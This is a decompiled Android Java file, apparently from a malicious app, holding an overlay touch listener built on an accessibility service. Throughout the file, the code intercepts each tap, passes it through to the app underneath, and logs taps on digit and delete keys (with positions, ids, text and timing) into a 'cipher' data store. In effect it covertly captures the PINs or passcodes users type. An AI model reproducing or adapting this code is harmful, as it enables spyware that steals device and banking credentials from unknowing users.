package com.storm.safe.rock.service.modules.cipher;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.service.modules.cipher.UiObject;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicReference;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC0721jk;
import p000.h10;
import p000.m71;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.cipher.a4 */
/* loaded from: classes2.dex */
public final class ViewOnTouchListenerC0338a4 implements View.OnTouchListener {
    /* renamed from: a0 */
    public static m71 m211849a0(CopyOnWriteArrayList copyOnWriteArrayList, int i, int i2) {
        Iterator it = copyOnWriteArrayList.iterator();
        while (it.hasNext()) {
            m71 m71Var = (m71) it.next();
            AccessibilityNodeInfo accessibilityNodeInfo = m71Var.f58288a5;
            Rect rect = m71Var.f58284a1;
            try {
                Rect rect2 = new Rect();
                accessibilityNodeInfo.getBoundsInParent(rect2);
                Rect rect3 = new Rect(rect);
                int iWidth = rect2.width() > rect3.width() ? (rect2.width() - rect3.width()) / 2 : 0;
                int iHeight = rect2.height() > rect3.height() ? (rect2.height() - rect3.height()) / 2 : 0;
                rect = (iWidth > 0 || iHeight > 0) ? new Rect(rect3.left - iWidth, rect3.top - iHeight, rect3.right + iWidth, rect3.bottom + iHeight) : rect3;
            } catch (Exception unused) {
            }
            if (rect.contains(i, i2)) {
                return m71Var;
            }
        }
        return null;
    }

    /* renamed from: a1 */
    public static ArrayList m211850a1(AccessibilityService accessibilityService) {
        UiObject uiObjectCreateRoot;
        UiObject uiObjectCreateRoot2;
        ArrayList arrayList = new ArrayList();
        List<AccessibilityWindowInfo> windows = accessibilityService.getWindows();
        if (windows != null) {
            for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                UiObject.C0333a0 c0333a0 = UiObject.f53271a6;
                AccessibilityNodeInfo root = accessibilityWindowInfo.getRoot();
                if (root != null && (uiObjectCreateRoot2 = c0333a0.createRoot(root)) != null) {
                    arrayList.add(uiObjectCreateRoot2);
                }
            }
        }
        if (arrayList.isEmpty() && (uiObjectCreateRoot = UiObject.f53271a6.createRoot(accessibilityService.getRootInActiveWindow())) != null) {
            arrayList.add(uiObjectCreateRoot);
        }
        return arrayList;
    }

    /* renamed from: a2 */
    public static boolean m211851a2(Rect rect, AccessibilityNodeInfo accessibilityNodeInfo, int i, int i2) {
        if (accessibilityNodeInfo != null) {
            Rect rect2 = new Rect();
            accessibilityNodeInfo.getBoundsInParent(rect2);
            Rect rect3 = new Rect(rect);
            int iWidth = rect2.width() > rect3.width() ? (rect2.width() - rect3.width()) / 2 : 0;
            int iHeight = rect2.height() > rect3.height() ? (rect2.height() - rect3.height()) / 2 : 0;
            rect = (iWidth > 0 || iHeight > 0) ? new Rect(rect3.left - iWidth, rect3.top - iHeight, rect3.right + iWidth, rect3.bottom + iHeight) : rect3;
        }
        return rect.contains(i, i2);
    }

    @Override // android.view.View.OnTouchListener
    public final boolean onTouch(View view, MotionEvent motionEvent) {
        AccessibilityService accessibilityService;
        boolean zIsClickable;
        if (motionEvent != null && motionEvent.getAction() == 0) {
            WindowManager windowManager = C0339a5.f53362a0;
            if (C0339a5.f53365a3 != null && (accessibilityService = C0339a5.f53369a7) != null) {
                float x = motionEvent.getX();
                float y = motionEvent.getY();
                int i = (int) x;
                int i2 = (int) y;
                if (!C0339a5.f53379b7) {
                    if (!C0339a5.f53374b2 && C0339a5.f53373b1.size() != 10) {
                        C0339a5.m211852a0();
                    }
                    if (C0339a5.f53377b5.get() == null) {
                        ArrayList arrayListM211850a1 = m211850a1(accessibilityService);
                        int size = arrayListM211850a1.size();
                        int i3 = 0;
                        while (i3 < size) {
                            Object obj = arrayListM211850a1.get(i3);
                            i3++;
                            WindowManager windowManager2 = C0339a5.f53362a0;
                            C0339a5.m211856a4((UiObject) obj, true);
                            if (C0339a5.f53377b5.get() != null) {
                                break;
                            }
                        }
                    }
                    if (C0339a5.f53378b6.get() == null) {
                        ArrayList arrayListM211850a12 = m211850a1(accessibilityService);
                        int size2 = arrayListM211850a12.size();
                        int i4 = 0;
                        while (i4 < size2) {
                            Object obj2 = arrayListM211850a12.get(i4);
                            i4++;
                            C0339a5.m211856a4((UiObject) obj2, false);
                            if (C0339a5.f53378b6.get() != null) {
                                break;
                            }
                        }
                    }
                    m71 m71VarM211849a0 = m211849a0(C0339a5.f53373b1, i, i2);
                    if (m71VarM211849a0 != null) {
                        m71VarM211849a0.m213947a0();
                        WindowManager windowManager3 = C0339a5.f53362a0;
                        C0339a5.f53366a4++;
                        C0339a5.f53372b0++;
                        int i5 = C0339a5.f53366a4;
                        long jNanoTime = System.nanoTime();
                        CipherDataHolder cipherDataHolder = C0339a5.f53364a2;
                        synchronized (cipherDataHolder) {
                            try {
                                cipherDataHolder.f53227a2.add(new Point(m71VarM211849a0.f58284a1.exactCenterX(), m71VarM211849a0.f58284a1.exactCenterY()));
                                if (m71VarM211849a0.f58285a2.length() > 0) {
                                    cipherDataHolder.f53226a1.add(new ListenPropResponse(Integer.valueOf(i5), "id", m71VarM211849a0.f58285a2, Long.valueOf(jNanoTime)));
                                }
                                if (m71VarM211849a0.f58286a3.length() > 0) {
                                    cipherDataHolder.f53226a1.add(new ListenPropResponse(Integer.valueOf(i5), "text", m71VarM211849a0.f58286a3, Long.valueOf(jNanoTime)));
                                }
                                if (m71VarM211849a0.f58287a4.length() > 0) {
                                    cipherDataHolder.f53226a1.add(new ListenPropResponse(Integer.valueOf(i5), "desc", m71VarM211849a0.f58287a4, Long.valueOf(jNanoTime)));
                                }
                            } finally {
                            }
                        }
                        return false;
                    }
                    AtomicReference atomicReference = C0339a5.f53377b5;
                    m71 m71Var = (m71) atomicReference.get();
                    if (m71Var != null && m211851a2(m71Var.f58284a1, m71Var.f58288a5, i, i2)) {
                        m71Var.m213947a0();
                        WindowManager windowManager4 = C0339a5.f53362a0;
                        CipherDataHolder cipherDataHolder2 = C0339a5.f53364a2;
                        synchronized (cipherDataHolder2) {
                            try {
                                if (!cipherDataHolder2.f53227a2.isEmpty()) {
                                    cipherDataHolder2.f53227a2.removeLast();
                                }
                                if (C0339a5.f53366a4 >= 0) {
                                    final int i6 = C0339a5.f53366a4;
                                    AbstractC0721jk.m213316h4(cipherDataHolder2.f53226a1, new h10() { // from class: com.storm.safe.rock.service.modules.cipher.TouchViewManager$OverlayTouchListener$onTouch$2$1
                                        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                                        {
                                            super(1);
                                        }

                                        @Override // p000.h10
                                        public final Object invoke(Object obj3) {
                                            ListenPropResponse listenPropResponse = (ListenPropResponse) obj3;
                                            t60.m214695b6(listenPropResponse, "it");
                                            Integer num = listenPropResponse.f53240a0;
                                            return Boolean.valueOf(num != null && num.intValue() == i6);
                                        }
                                    });
                                    C0339a5.f53366a4--;
                                    int i7 = C0339a5.f53372b0;
                                    if (i7 > 0) {
                                        C0339a5.f53372b0 = i7 - 1;
                                    }
                                }
                            } finally {
                            }
                        }
                        return false;
                    }
                    AtomicReference atomicReference2 = C0339a5.f53378b6;
                    m71 m71Var2 = (m71) atomicReference2.get();
                    if (m71Var2 != null && m211851a2(m71Var2.f58284a1, m71Var2.f58288a5, i, i2)) {
                        m71Var2.m213947a0();
                        return false;
                    }
                    WindowManager windowManager5 = C0339a5.f53362a0;
                    UiObject uiObjectM211855a3 = C0339a5.m211855a3(accessibilityService, x, y);
                    if (uiObjectM211855a3 != null) {
                        String strM211780a6 = uiObjectM211855a3.m211780a6();
                        if (strM211780a6 == null) {
                            strM211780a6 = "";
                        }
                        String strM211782a8 = uiObjectM211855a3.m211782a8();
                        if (strM211782a8 == null) {
                            strM211782a8 = "";
                        }
                        String strM211775a1 = uiObjectM211855a3.m211775a1();
                        if (strM211775a1 == null) {
                            strM211775a1 = "";
                        }
                        if (!strM211780a6.equals("com.android.systemui:id/scrim_behind")) {
                            m71 m71Var3 = (m71) atomicReference.get();
                            m71 m71Var4 = (m71) atomicReference2.get();
                            if ((m71Var3 == null || !t60.m214686a2(uiObjectM211855a3.m211780a6(), m71Var3.f58285a2) || m71Var3.f58285a2.length() <= 0) && (m71Var4 == null || !t60.m214686a2(uiObjectM211855a3.m211780a6(), m71Var4.f58285a2) || m71Var4.f58285a2.length() <= 0)) {
                                boolean z = AbstractC0779a1.m213652a5(strM211780a6, "delete", true) || AbstractC0779a1.m213652a5(strM211775a1, "删除", false) || strM211775a1.equalsIgnoreCase("delete");
                                boolean z2 = (strM211782a8.length() == 1 && Character.isDigit(strM211782a8.charAt(0))) || (strM211775a1.length() == 1 && Character.isDigit(strM211775a1.charAt(0)));
                                try {
                                    uiObjectM211855a3.f53272a0.performAction(16);
                                } catch (Exception unused) {
                                }
                                if (z) {
                                    CipherDataHolder cipherDataHolder3 = C0339a5.f53364a2;
                                    synchronized (cipherDataHolder3) {
                                        try {
                                            if (!cipherDataHolder3.f53227a2.isEmpty()) {
                                                cipherDataHolder3.f53227a2.removeLast();
                                            }
                                            if (C0339a5.f53366a4 >= 0) {
                                                AbstractC0721jk.m213316h4(cipherDataHolder3.f53226a1, new h10() { // from class: com.storm.safe.rock.service.modules.cipher.TouchViewManager$OverlayTouchListener$onTouch$3$1
                                                    @Override // p000.h10
                                                    public final Object invoke(Object obj3) {
                                                        ListenPropResponse listenPropResponse = (ListenPropResponse) obj3;
                                                        t60.m214695b6(listenPropResponse, "it");
                                                        Integer num = listenPropResponse.f53240a0;
                                                        WindowManager windowManager6 = C0339a5.f53362a0;
                                                        return Boolean.valueOf(num != null && num.intValue() == C0339a5.f53366a4);
                                                    }
                                                });
                                                C0339a5.f53366a4--;
                                                int i8 = C0339a5.f53372b0;
                                                if (i8 > 0) {
                                                    C0339a5.f53372b0 = i8 - 1;
                                                }
                                            }
                                        } finally {
                                        }
                                    }
                                } else if (z2) {
                                    Rect rectM211774a0 = uiObjectM211855a3.m211774a0();
                                    Point point = rectM211774a0 != null ? new Point(rectM211774a0.exactCenterX(), rectM211774a0.exactCenterY()) : new Point(x, y);
                                    C0339a5.f53366a4++;
                                    C0339a5.f53372b0++;
                                    int i9 = C0339a5.f53366a4;
                                    long jNanoTime2 = System.nanoTime();
                                    CipherDataHolder cipherDataHolder4 = C0339a5.f53364a2;
                                    synchronized (cipherDataHolder4) {
                                        try {
                                            cipherDataHolder4.f53227a2.add(point);
                                            if (strM211780a6.length() > 0) {
                                                cipherDataHolder4.f53226a1.add(new ListenPropResponse(Integer.valueOf(i9), "id", strM211780a6, Long.valueOf(jNanoTime2)));
                                            }
                                            if (strM211782a8.length() > 0) {
                                                cipherDataHolder4.f53226a1.add(new ListenPropResponse(Integer.valueOf(i9), "text", strM211782a8, Long.valueOf(jNanoTime2)));
                                            }
                                            if (strM211775a1.length() > 0) {
                                                cipherDataHolder4.f53226a1.add(new ListenPropResponse(Integer.valueOf(i9), "desc", strM211775a1, Long.valueOf(jNanoTime2)));
                                            }
                                        } finally {
                                        }
                                    }
                                } else {
                                    try {
                                        zIsClickable = uiObjectM211855a3.f53272a0.isClickable();
                                    } catch (Exception unused2) {
                                        zIsClickable = false;
                                    }
                                    if (zIsClickable) {
                                        Rect rectM211774a02 = uiObjectM211855a3.m211774a0();
                                        Point point2 = rectM211774a02 != null ? new Point(rectM211774a02.exactCenterX(), rectM211774a02.exactCenterY()) : new Point(x, y);
                                        C0339a5.f53366a4++;
                                        C0339a5.f53372b0++;
                                        int i10 = C0339a5.f53366a4;
                                        long jNanoTime3 = System.nanoTime();
                                        CipherDataHolder cipherDataHolder5 = C0339a5.f53364a2;
                                        synchronized (cipherDataHolder5) {
                                            cipherDataHolder5.f53227a2.add(point2);
                                            if (strM211780a6.length() > 0) {
                                                cipherDataHolder5.f53226a1.add(new ListenPropResponse(Integer.valueOf(i10), "id", strM211780a6, Long.valueOf(jNanoTime3)));
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        return false;
    }
}
